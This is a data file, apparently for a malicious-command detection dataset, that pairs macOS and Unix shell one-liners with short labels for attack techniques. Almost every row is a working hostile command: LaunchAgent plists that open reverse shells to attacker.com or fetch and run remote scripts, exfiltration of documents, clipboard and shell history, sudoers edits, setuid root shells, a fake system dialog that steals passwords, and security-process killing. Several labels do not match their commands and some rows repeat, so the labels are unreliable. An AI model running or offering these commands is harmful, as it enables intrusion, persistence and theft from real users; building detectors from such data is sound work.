"tar -czvf sensitive-documents.tar.gz ~/Documents && openssl enc -aes-256-cbc -salt -in sensitive-documents.tar.gz -out sensitive-documents.tar.gz.enc -k pass","Compressing and encrypting sensitive documents located in the ~/Documents directory."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing any command without a password."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"find ~/Documents -name '*.pdf' -exec scp {} attacker@malicious-server.com:/stolen_data/ \;","Exfiltrating sensitive files from the system to a remote server."
"echo 'nameserver 8.8.8.8' > /etc/resolv.conf && networksetup -setdnsservers Wi-Fi 8.8.8.8","Manipulating system network configurations to redirect traffic."
"sudo killall -HUP mDNSResponder && echo '204.79.197.200 www.example.com' >> /etc/hosts","Performing DNS cache poisoning on the system."
"while inotifywait -e create ~/Documents; do tar -zcvf ~/Documents/archive.tar.gz ~/Documents/*; scp ~/Documents/archive.tar.gz user@remote-server.com:/path/to/exfiltrate; done","A script that monitors the Documents directory for new files and automatically compresses and exfiltrates them to a remote server."
"echo ""alias ssh='SSH_AUTH_SOCK=~/malicious_agent.sock ssh'"" >> ~/.zshrc","Persistence via SSH agent hijacking on a macOS system."
"while true; do screencapture -x ~/Desktop/capture_$(date +%s).png; sleep 300; done","A scenario where an attacker automates screen captures on a macOS system to exfiltrate sensitive information."
"osascript -e 'set the clipboard to (the clipboard as record)' -e 'if (exists image 1 of the clipboard) then' -e 'set theFile to ((path to desktop as text) & ""clipboard_image.png"")' -e 'write (the clipboard as JPEG picture) to file theFile' -e 'end if'","An exploit that extracts the current image content from the clipboard on a macOS system."
"pbpaste | grep -Eo '\b[0-9]{16}\b' | curl -d @- http://malicious-url.com/collect","Filtering the clipboard content for sensitive information like credit card numbers before exfiltration."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.apple.keystrokeLogging</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
 <string>/Users/Shared/.keylogger.py</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>KeepAlive</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.keystrokeLogging.plist && launchctl load ~/Library/LaunchAgents/com.apple.keystrokeLogging.plist && echo 'import sys, time
from AppKit import NSPasteboard, NSStringPboardType

logfile = ""/Users/Shared/clipboard.log""

while True:
 pb = NSPasteboard.generalPasteboard()
 pbstring = pb.stringForType_(NSStringPboardType)
 if pbstring is not None:
 with open(logfile, ""a"") as f:
 f.write(""%s: %s\n"" % (time.strftime(""%Y-%m-%d %H:%M:%S""), pbstring.encode(""utf-8"")))
 time.sleep(5)' > /Users/Shared/.keylogger.py","Persistence via malicious plist to monitor keystrokes and export clipboard contents on macOS."
"sudo ifconfig en0 promisc","Malicious shell command to enable promiscuous mode on a network interface in macOS for network traffic sniffing."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist in LaunchAgents to execute a script on system startup."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfl9...' >> ~/.ssh/authorized_keys","A scenario involving the addition of unauthorized SSH keys to enable persistent remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-s</string>
 <string>http://malicious-url.com/payload.sh</string>
 <string>|</string>
 <string>/bin/bash</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist in LaunchAgents to execute code at login."
"echo 'osascript -e ""do shell script \""chmod 777 /etc/sudoers\"" with administrator privileges' | sudo -s","Privilege escalation by exploiting a misconfigured sudoers file that allows executing a specific command as root without a password."
"echo 'function sudo() { echo password | /usr/bin/sudo -S $@; /usr/bin/sudo /bin/sh -c ""/path/to/malicious/script""; }' >> ~/.bash_profile && source ~/.bash_profile","Alias and function overrides to intercept user commands and execute malicious code."
"echo 'curl -s http://malicious-url.com/malicious_script.sh | /bin/bash' >> ~/.bash_profile","Editing the bash profile to include a malicious script execution upon terminal launch."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.agent</string><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>$(curl -fsSL http://malicious-url.com/script.sh)</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launch agent that executes a remote shell script on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.harvest.credentials</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
 <string>/Users/Shared/credential_harvester.py</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.harvest.credentials.plist && launchctl load ~/Library/LaunchAgents/com.harvest.credentials.plist","Persistence via malicious plist to maintain access and launch a credential harvesting script at login."
"security find-generic-password -wa 'Chrome' > /tmp/chrome_key.txt && python extract_chrome_passwords.py /tmp/chrome_key.txt","Browser password extraction using a script to access the Chrome Safe Storage keychain."
"curl -s http://malicious-url.com/fakeupdate.pkg > /tmp/fakeupdate.pkg && installer -pkg /tmp/fakeupdate.pkg -target /","Installation of a trojan application disguised as a legitimate software update."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.payload</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/payload.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
		<string>chmod</string>
		<string>+x</string>
		<string>/tmp/payload.sh</string>
		<string>/tmp/payload.sh</string>
	</array>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.payload.plist && launchctl load ~/Library/LaunchAgents/com.malicious.payload.plist","Persistence via malicious plist to execute a downloaded payload every 60 minutes."
"osascript -e 'Tell application ""System Events"" to display dialog ""System Alert: Your macOS has detected a security issue. Please enter your username:"" default answer """" with hidden answer' -e 'text returned of result' > /tmp/username.txt && osascript -e 'Tell application ""System Events"" to display dialog ""System Alert: Please enter your password:"" default answer """" with hidden answer' -e 'text returned of result' > /tmp/password.txt && curl -T /tmp/username.txt ftp://attacker.com/uploads/ && curl -T /tmp/password.txt ftp://attacker.com/uploads/","Phishing attack script that masquerades as a legitimate system alert to capture user credentials."
"curl -o /tmp/keylogger http://malicious-url.com/keylogger && chmod +x /tmp/keylogger && /tmp/keylogger | nc attacker.com 4444 &","Keylogging script that captures keystrokes and sends them to a remote server."
"while true; do pbpaste | diff - /tmp/clipboard -q || (pbpaste > /tmp/clipboard && curl -X POST --data-binary @/tmp/clipboard http://attacker.com/clipboard); sleep 10; done &","Clipboard monitoring script that checks for changes in the clipboard and exfiltrates the data."
"while true; do cat ~/.zsh_history ~/.bash_history | nc attacker.com 1234; sleep 300; done","Tracking user activity by monitoring command history changes."
"echo 'echo ""$(whoami) ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers' | sudo -s","Privilege escalation by exploiting kernel vulnerabilities through the use of unsigned drivers, leading to the bypassing of System Integrity Protection (SIP) on a macOS system."
"cp /usr/bin/env /tmp/; chmod u+s /tmp/env","Privilege escalation by exploiting setuid binaries through environment variable manipulation."
"echo 'function /usr/bin/id { /bin/bash -p; }' > /tmp/env_overrides; export BASH_ENV=/tmp/env_overrides","Injecting malicious code into the environment to hijack a setuid binary execution."
"env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p)' /path/to/setuid/binary","Overwriting the environment of a setuid binary to gain elevated privileges."
"curl -s http://malicious-domain.com/fakeupdate.sh | bash","Malware installation through a disguised Bash script that appears to be a software update."
"ps aux | grep -i 'securityd' | awk '{print $2}' | xargs kill -9","A scenario where a script is used to monitor running processes and identify security software processes to kill them."
"osascript -e 'do shell script ""curl http://malicious-url.com/payload.sh | bash"" with administrator privileges'","Persistence via scripting additions that execute every time a user logs in."
"while true; do screencapture -x ~/Library/Caches/$(date +%s).jpg; sleep 300; done","Stealthy screen capture on macOS for unauthorized surveillance."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"sudo /usr/bin/python /path/to/sslstrip.py -l 8080 -a -k -f","Interception of network traffic to perform SSL stripping."
"echo 'int main() { setuid(0); system(""/bin/sh""); return 0; }' > priv_esc.c && gcc priv_esc.c -o priv_esc && chmod u+s priv_esc && ./priv_esc","Injecting code into a running process with elevated privileges."
"0 * * * * /usr/bin/curl http://malicious-url.com/script.sh | /bin/bash","Persistence via a malicious cron job that downloads and executes a script every hour."
"for user in $(cat users.txt); do for pass in $(cat passwords.txt); do ssh $user@target.com -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -i /dev/null 2>&1 | grep 'Permission denied' && echo ""Login failed for $user with $pass"" || echo ""Success for $user"" && break; done; done","A scenario where an attacker uses a script to perform password spraying against SSH services on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"touch -t 202301010000 /var/db/sudo","Privilege escalation by exploiting sudo timestamp spoofing."
"while true; do screencapture -x ~/.hidden/screenshot_$(date +%s).png; sleep 60; done","Capturing screenshots of a user's desktop every minute and saving them to a hidden directory."
"echo 'username ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers","A scenario where the sudoers file is modified to allow passwordless sudo access for a specific user on a macOS system."
"while :; do ps aux; done","Malicious command that creates an infinite loop to exhaust system resources by repeatedly listing all processes."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via cron job that downloads and executes a script every hour."
"osascript -e 'tell application ""Contacts"" to get every person's email' > /tmp/contacts.txt && mail -s ""Contacts Backup"" -A /tmp/contacts.txt attacker@example.com < /dev/null","Harvesting contact list information from a macOS system and sending it via email using an automated script."
"curl -s http://fake-update.com/fake-update.pkg -o /tmp/fake-update.pkg && sudo installer -pkg /tmp/fake-update.pkg -target /","Malicious command to download and execute a fake software update on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to gain remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system startup."
